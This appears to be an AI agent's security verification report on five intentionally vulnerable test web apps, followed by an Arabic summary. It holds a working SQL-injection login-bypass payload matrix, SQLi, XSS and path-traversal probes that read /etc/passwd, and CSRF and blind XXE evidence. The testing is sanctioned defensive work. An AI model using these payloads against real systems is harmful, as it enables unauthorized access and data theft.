# INDEPENDENT VERIFIER REPORT — Round IV13 (2026-10-03)

**Scope of independence (honest):** this round was ordered by the supervisor as the
first "external" verification pass over the five sanctioned targets. The verifier
(Super Z, main agent) used ONLY raw stdlib-urllib/curl tooling — zero SENTINEL
detector/verifier code, zero SENTINEL findings consulted for target selection
(public knowledge + live recon only; the one exception is the CSRF endpoint
/catalog/cart, which the supervisor named explicitly). It is therefore an
**independent-toolchain** verification, not an independent-human verification —
the supervisor should treat it accordingly.

- Targets: demo.testfire.net, ginandjuice.shop, testasp.vulnweb.com,
  testaspnet.vulnweb.com, google-gruyere.appspot.com (all sanctioned test apps).
- Transport note: testfire/testasp/testaspnet served over **http://** — their TLS
  certificates are expired/invalid (documented; matches the prior campaign's
  transport).
- Gruyere: fresh instance `399537805906358592369366415027868878530` created via the
  sanctioned `/start` launcher.
- Scripts (committed): `scripts/iv13_*.py`. Raw evidence JSONs:
  `build-v422/results/iv13_evidence/`.

---

## 1. Calibration — demo.testfire.net /doLogin (supervisor question 1)

17-case payload matrix + 2 controls, 2026-10-03 15:36 (+02:00), fresh session per probe:

| family | uid payload | result |
|---|---|---|
| control benign | `ivinvalid7x9` | 302 -> login.jsp (rejected) |
| control quote | `'` | 302 -> login.jsp |
| S1 string-quote | `' OR '1'='1` | 302 -> login.jsp **rejected** |
| S2 string-quote closed | `' OR '1'='1'` | rejected |
| S3 string-quote empty | `' or ''='` | rejected |
| S4 string-quote abc | `' OR 'abc'='abc'` | rejected |
| S5 string+comment | `' OR '1'='1'-- ` | **302 -> /bank/main.jsp BYPASS** |
| S6 string+hash | `' OR '1'='1'#` | rejected |
| **N1 numeric+comment** | **`' OR 1=1--`** | **302 -> /bank/main.jsp BYPASS** |
| N1b numeric (empty passw) | `' OR 1=1--` (passw="") | rejected (app-level empty-password validation) |
| N1c numeric+prefix | `1' OR 1=1--` | **BYPASS** |
| N2 numeric+hash | `' OR 1=1#` | rejected |
| N3 numeric no-comment | `' OR 1=1` | rejected |
| N4 numeric-lt+comment | `' OR 2>1--` | **BYPASS** |
| N5 false-control | `' OR 1=2--` | rejected (clean differential: 1=1 in / 1=2 out) |
| P1 user+comment | `admin'--` | **BYPASS** |
| P2 user+hash | `admin'#` | rejected |
| B1 both fields | `' OR 1=1--` both | **BYPASS** |

**Exact answer to the supervisor's question:** the formats that bypass into
/bank/main.jsp are **every `--`-comment family** — numeric-comment
(`' OR 1=1--`, `1' OR 1=1--`, `' OR 2>1--`), string-quote+comment
(`' OR '1'='1'-- `), user-comment (`admin'--`), and both-fields. The
**string-quote family WITHOUT comment does NOT bypass** (S1–S4): operator
precedence keeps `AND password='x'` bound to the OR clause, so the password
predicate still gates the query. `#` comments fail (SQL Server does not treat
`#` as a comment). An empty `passw` fails even with a valid payload
(application-level validation).

**Full bypass proof (followed):** `POST /doLogin` `uid=1' OR 1=1--&passw=x`
-> 302 Location `/bank/main.jsp`; following with the session
(JSESSIONID + AltoroAccounts) -> **200, title "Altoro Mutual", 7277 B** —
authenticated landing confirmed.

**Flap re-check** (~40 min later, 16:2x): S1 rejected / S5 BYPASS / N1 BYPASS /
N5 rejected — identical verdicts; no flap in this window. This matches the
v4.2.2 addendum's record that the numeric family is the currently-reliable
battery (and its three-window flap history for the string family).

---

## 2. Independent confirmed list (supervisor question 2)

10 strong-class findings, each reproduced live by this verifier with raw evidence:

| # | target | class | endpoint / param | one-line evidence |
|---|---|---|---|---|
| 1 | demo.testfire.net | SQLi (auth bypass) | POST /doLogin `uid` | `' OR 1=1--` -> 302 /bank/main.jsp; session-authenticated GET 200 "Altoro Mutual" |
| 2 | ginandjuice.shop | CSRF | POST /catalog/cart `productId,redir,quantity` | cross-origin POST (evil Origin/Referer, no token) -> 302, cart 0->1 |
| 3 | ginandjuice.shop | XXE (blind) | POST /catalog/product/stock (XML body) | external entity processing active (differential parse behavior); no in-band reflection |
| 4 | testasp.vulnweb.com | SQLi (boolean) | /showforum.asp `id` | `0 AND 1=1` -> 200/content vs `0 AND 1=2` -> 500; `0 OR 1=1` -> 200 expanded |
| 5 | testaspnet.vulnweb.com | SQLi (boolean) | /Comments.aspx `id` | AND 1=1 -> 35049 B vs AND 1=2 -> 13310 B |
| 6 | testaspnet.vulnweb.com | SQLi (boolean) | /ReadNews.aspx `id` | AND 1=1 -> 22848 B vs AND 1=2 -> 13444 B |
| 7 | testaspnet.vulnweb.com | XSS (stored) | /Comments.aspx `tbComment` | `<u>zxK1mQ7v</u>` posted via real form; reload renders raw in CommentText div |
| 8 | google-gruyere.appspot.com | path traversal | URL path `..%2f` x4 | `/etc/passwd` content returned 200/246 B |
| 9 | google-gruyere.appspot.com | XSS (stored) | /saveprofile `uid` (signup) | uid `iv13<u>m</u>` rendered raw in home menu-user |
| 10 | google-gruyere.appspot.com | XSS (reflected) | /snippets.gtl `uid` | reflected raw inside `<h2 id="user_name">` |

Honest negatives (probed, NOT confirmed — see also §4):
ginandjuice `searchTerm` reflected **escaped** (tag + attribute-break probes) and
**not SQL-injectable** across 11 payload variants; `productId`/`postId` strictly
int-validated (400); stock-checker XML `productId` int-validated
("Product ID must be a number"); testaspnet `NewsAd` reflection is URL-encoded
(no attribute breakout) and ASP.NET request validation rejects raw `<`
(500); testasp Templatize.asp traversal attempts all 500 (not reproduced);
testasp Search.asp tfSearch 500s on every value this verifier sent (endpoint
unusable as tested, no verdict).

---

## 3. CSRF adjudication — ginandjuice.shop/catalog/cart (supervisor question 3)

**Verdict: the CSRF claim is REAL — there is no effective protection on
add-to-cart, update-quantity, or remove-item (all POST /catalog/cart).**

Four independent evidence layers (full battery in `iv13_evidence/gj_csrf_battery.json`):

1. **Token layer — absent on the cart operations.** The add-to-cart form
   (`productId`, `redir`, `quantity`), the update-quantity form, and the
   remove form (`quantity=-N`) carry **no csrf field**. The application DOES
   have a csrf framework — `login`, `subscribe`, `coupon`
   (/catalog/cart/coupon), and `checkout` (/catalog/cart/checkout) forms all
   embed `csrf` tokens — it is simply not applied to the three cart
   operations.
2. **Server-side enforcement — none.** With a fresh session:
   - legit same-site POST (Origin/Referer = ginandjuice.shop): 302, cart count 0 -> 1.
   - **cross-origin POST (Origin/Referer = https://evil-iv13.example), no
     token: 302, cart count 0 -> 1 — state changed.** No Origin/Referer
     validation exists.
   - no-Origin / no-Referer POST: 302, cart 0 -> 1 (also accepted).
   - GET-based add: rejected (200, no change) — the state change is POST-only,
     so the attack needs a standard auto-submitting form page.
3. **Cookie layer — SameSite=None.** Every response sets
   `session=...; Secure; HttpOnly; SameSite=None`. SameSite=None is an
   explicit opt-OUT of the browser Lax default, so modern browsers WILL attach
   the session cookie to cross-site POSTs. This is the layer that would have
   made the claim wrong — it does the opposite.
4. **Impact scope.** Proof was performed on the pre-authentication cart (same
   server-side handler and same session cookie as post-login). Impact:
   forced add/update/remove of items in a victim's cart (purchase-flow
   manipulation). Checkout and coupon ARE token-bearing (their enforcement was
   not separately tested this round — noted as open).

The supervisor's alternative hypothesis ("SameSite or token makes the claim
wrong") is therefore **refuted for /catalog/cart**: the token is missing on this
endpoint specifically, and the cookie is SameSite=None.

---

## 4. Could not be completed by this verifier (honest)

- **ginandjuice authenticated session:** POST /login (csrf + username=carlos)
  returned to /login without authenticating; the notification area is
  JS-rendered so the failure reason is not visible to a static client. The
  authed surface (account, checkout enforcement) remains unverified.
- **XXE OOB exfiltration:** no inbound listener exists in this environment;
  stock values fluctuate per request, so no value oracle. External entity
  processing is proven (see evidence chain in §2 row 3) but data exfiltration
  was not demonstrated.
- **Differential note on XXE evidence:** entity-in-productId yields
  "Invalid product ID" (20 B) — a third, distinct error path from
  literal-non-integer ("Product ID must be a number", 29 B) and
  literal-integer-unknown-product ("No such product or store", 26 B) — while
  entity-in-storeId passes and returns a stock number, and an external
  https:// entity breaks parsing ("XML parsing error"). External entity
  resolution is active; content is not reflected.
- **17 SENTINEL claims not covered:** 14 were simply not probed by this round
  (out of scope/time: testfire XSS pages, testasp Login/showthread, ginandjuice
  category/DOM/CRLF/redirect, gruyere re-test on SENTINEL's instance); 3 were
  probed and **not reproduced** (ginandjuice `/catalog?searchTerm` xss — this
  verifier sees the value HTML-escaped; testasp `Search.asp?tfSearch` sql/xss —
  endpoint 500s on all inputs; testasp `Templatize.asp?item` traversal — all
  variants 500). These three rows deserve a second look with the raw packages
  side by side.

---

## 5. Comparison-frame run (first REAL external list)

`scripts/compare_external_findings.py` was run with this round's list
(`build-v422/results/external_comparison/iv13_external_list.json`) against the
v4.2.1 five-target scans + the v4.2.2 testfire re-scan:

- **(c) CONFIRMED by both: 6** — testfire /doLogin SQLi (EXACT), ginandjuice
  /catalog/cart CSRF (STRONG), ginandjuice /catalog/product/stock XXE (STRONG),
  testasp /showforum.asp SQLi (EXACT), testaspnet /Comments.aspx SQLi (EXACT),
  testaspnet /ReadNews.aspx SQLi (EXACT).
- **(a) GAPS (external found, SENTINEL strong list lacks): 4 rows / 3 real** —
  testaspnet stored XSS (tbComment), gruyere path traversal, gruyere saveprofile
  stored XSS; plus one path-alias: gruyere snippets.gtl reflected XSS (this
  verifier's fresh instance URL cannot path-match SENTINEL's different instance
  — class+param agree, the tool correctly kept them separate by design).
- **(b) UNCONFIRMED (SENTINEL claims, this round did not confirm): 17** — see
  §4 for the honest breakdown (14 unprobed, 3 not reproduced).
- unparsed: 0.

Full outputs: `build-v422/results/external_comparison/iv13_report.{md,json}`.

---

## ملخص عربي صادق (Arabic honest summary)

جرى هذا التحقق بأدوات خام مستقلة تمامًا عن كود SENTINEL، وبلا اطلاع على قائمة
نتائجه عند اختيار الأهداف — لكنه نفّذه نفس الوكيل (Super Z) بلا أدوات المحرك،
فهو استقلالية أدوات لا استقلالية جهة ثالثة.

1. **المعايرة:** الصيغة التي تتجاوز doLogin إلى /bank/main.jsp هي كل عائلات
   التعليق `--` (رقمية `' OR 1=1--`، نصية `' OR '1'='1'--`، `admin'--`).
   عائلة الاقتباس النصي **بدون** تعليق تفشل (أسبقية AND تُبقي شرط كلمة
   المرور)، و`#` يفشل (SQL Server)، وكلمة مرور فارغة تفشل بتحقق تطبيقي.
   إثبات كامل: 302 ثم 200 بعنوان Altoro Mutual بجلسة موثقة. لا تذبذب في
   نافذة اليوم.
2. **قائمتي المستقلة:** 10 ثغرات مؤكدة بدليل خام (تجاوز دخول testfire، CSRF
   السلة، XXE أعمى في فاحص المخزون، SQLi بوليانية في testasp وtestaspnet
   ×3، XSS مخزنة في تعليقات testaspnet، وثلاث في gruyere: اجتياز مسار قرأ
   /etc/passwd فعليًا + XSS مخزنة عبر التسجيل + XSS منعكسة في snippets).
3. **حكم CSRF على /catalog/cart: الثغرة حقيقية.** لا توكن في نماذج
   الإضافة/التعديل/الحذف (بينما login/subscribe/coupon/checkout لديها
   توكنات!)، ولا تحقق من Origin/Referer (طلب بأصل معادٍ غيّر السلة 0->1)،
   وكوكي الجلسة `SameSite=None` أي أن المتصفحات سترفقه مع الطلبات العابرة
   للمواقع. فرضية الحماية المضادة سقطت.
4. **المقارنة الأولى الحقيقية:** 6 مؤكدة للطرفين (منها CSRF وXXE في
   ginandjuice باتفاق قوي)، 3 فجوات حقيقية لدى SENTINEL (XSS المخزنة في
   testaspnet، واجتياز المسار وXSS المخزنة في gruyere)، و17 دعوى لـ
   SENTINEL لم يؤكدها هذا الجول: 14 لم تُفحص، و**3 فُحصت ولم تُستنسخ**
   (searchTerm XSS، tfSearch، Templatize) — تستحق مراجعة جانبية مع الحزم
   الخام.
